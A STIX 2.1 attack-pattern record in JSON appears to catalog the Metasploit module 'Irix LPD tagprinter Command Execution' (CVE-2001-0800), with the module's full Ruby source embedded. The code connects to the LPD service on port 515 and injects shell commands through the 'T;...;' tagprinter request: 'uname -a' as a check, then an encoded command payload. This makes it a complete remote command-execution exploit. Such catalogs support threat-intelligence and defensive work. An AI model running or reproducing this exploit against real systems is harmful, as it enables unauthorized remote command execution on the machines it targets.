{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--845392f5-6225-4575-a59c-9b39163b6714",
    "created": "2024-08-14T16:56:53.105756Z",
    "modified": "2024-08-14T16:56:53.10576Z",
    "name": "Irix LPD tagprinter Command Execution",
    "description": " This module exploits an arbitrary command execution flaw in the in.lpd service shipped with all versions of Irix. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/irix/lpd/tagprinter_exec.rb",
            "external_id": "tagprinter_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0800"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Irix LPD tagprinter Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution flaw in\n        the in.lpd service shipped with all versions of Irix.\n      },\n      'Author'         => [ 'optyx', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2001-0800'],\n          ['OSVDB', '8573']\n        ],\n      'Privileged'     => false,\n      'Platform'       => %w{ irix unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 512,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DisclosureDate' => '2001-09-01',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(515)\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"T;uname -a;\\n\")\n    resp = sock.get_once\n    disconnect\n\n    if (resp =~ /IRIX/)\n      vprint_status(\"Response: #{resp.strip}\")\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n    sock.put(\"T;#{payload.encoded};\\n\")\n    handler\n    print_status(\"Payload: #{payload.encoded}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-09-01",
    "x_mitre_platforms": [
        "%w{ irix unix }"
    ]
}